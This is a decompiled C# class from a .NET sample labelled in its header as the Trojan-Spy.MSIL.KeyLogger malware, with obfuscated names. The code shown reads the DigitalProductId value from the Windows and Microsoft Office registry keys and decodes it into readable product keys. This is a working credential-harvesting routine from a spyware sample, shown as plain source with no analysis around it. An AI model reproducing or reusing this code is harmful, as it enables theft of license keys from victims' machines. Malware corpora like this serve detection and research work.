// Decompiled with JetBrains decompiler
// Type: .
// Assembly: dfghdfghtyetryetyetyety, Version=2.3.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 915EBE8E-E020-4182-8C70-BC975537D555
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan-Spy.MSIL.KeyLogger.cfj-677ef471c45c3e8820d5a40a4929bde24bd6660e8659c852e91d3edbc7fa5d9a.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System.Collections;
using System.Diagnostics;

namespace \u0002
{
  internal class \u0002
  {
    [DebuggerNonUserCode]
    public \u0002()
    {
    }

    public static byte[] \u0002(\u0002.\u0002.\u0001 key)
    {
      byte[] numArray1 = (byte[]) null;
      RegistryKey registryKey = (RegistryKey) null;
      switch (key)
      {
        case \u0002.\u0002.\u0001.\u0001:
          registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", false);
          break;
        case \u0002.\u0002.\u0001.\u0002:
          registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Office\\11.0\\Registration\\{90110409-6000-11D3-8CFE-0150048383C9}", false);
          break;
        case \u0002.\u0002.\u0001.\u0003:
          registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Office\\12.0\\Registration\\{91120000-002F-0000-0000-0000000FF1CE}", false);
          break;
      }
      if (registryKey != null)
      {
        byte[] numArray2 = registryKey.GetValue("DigitalProductId") as byte[];
        registryKey.Close();
        return numArray2;
      }
      if (registryKey == null)
        numArray1 = (byte[]) null;
      return numArray1;
    }

    public static string \u0002(byte[] digitalProductId)
    {
      if (digitalProductId == null)
        return "";
      char[] chArray1 = new char[24]
      {
        'B',
        'C',
        'D',
        'F',
        'G',
        'H',
        'J',
        'K',
        'M',
        'P',
        'Q',
        'R',
        'T',
        'V',
        'W',
        'X',
        'Y',
        '2',
        '3',
        '4',
        '6',
        '7',
        '8',
        '9'
      };
      char[] chArray2 = new char[29];
      ArrayList arrayList = new ArrayList();
      int index1 = 52;
      do
      {
        arrayList.Add((object) digitalProductId[index1]);
        checked { ++index1; }
      }
      while (index1 <= 67);
      int index2 = 28;
      do
      {
        if (checked (index2 + 1) % 6 == 0)
        {
          chArray2[index2] = '-';
        }
        else
        {
          int index3 = 0;
          int index4 = 14;
          do
          {
            int num = index3 << 8 | (int) Conversions.ToByte(arrayList[index4]);
            arrayList[index4] = (object) checked ((byte) unchecked (num / 24));
            index3 = num % 24;
            chArray2[index2] = chArray1[index3];
            checked { index4 += -1; }
          }
          while (index4 >= 0);
        }
        checked { index2 += -1; }
      }
      while (index2 >= 0);
      return new string(chArray2);
    }

    internal enum \u0001
    {
      \u0001,
      \u0002,
      \u0003,
    }
  }
}
